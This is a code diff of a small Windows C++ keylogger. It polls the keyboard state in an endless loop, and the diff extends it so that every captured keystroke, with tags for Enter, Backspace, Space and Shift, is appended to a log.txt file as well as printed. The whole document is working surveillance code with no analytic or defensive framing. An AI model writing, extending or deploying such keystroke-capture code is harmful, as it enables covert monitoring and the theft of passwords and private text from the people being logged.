@@ -1,15 +1,20 @@
 #include <windows.h>
 #include <iostream>
+#include <fstream>
 
 int main() {
+    std::ofstream outfile{"log.txt", std::ios::app};
     while (true) {
         for (int ch = 8; ch <= 255; ch++) {
             if (GetAsyncKeyState(ch) & 0x8000) {
-                if (ch == VK_RETURN) std::cout << "{ENTER}" << std::endl;
-                else if (ch == VK_BACK) std::cout << "{BACKSPACE}" << std::endl;
-                else if (ch == VK_SPACE) std::cout << "{SPACE}" << std::endl;
-                else if (ch == VK_SHIFT) std::cout << "{SHIFT}" << std::endl;
-                std::cout << char(ch) << std::endl;
+                std::string t;
+                if (ch == VK_RETURN) t = "{ENTER}";
+                else if (ch == VK_BACK) t = "{BACKSPACE}";
+                else if (ch == VK_SPACE) t = "{SPACE}";
+                else if (ch == VK_SHIFT) t = "{SHIFT}";
+                else t = char(ch);
+                std::cout << t << "\n";
+                outfile << t << std::endl;
             }
         }
         Sleep(50);
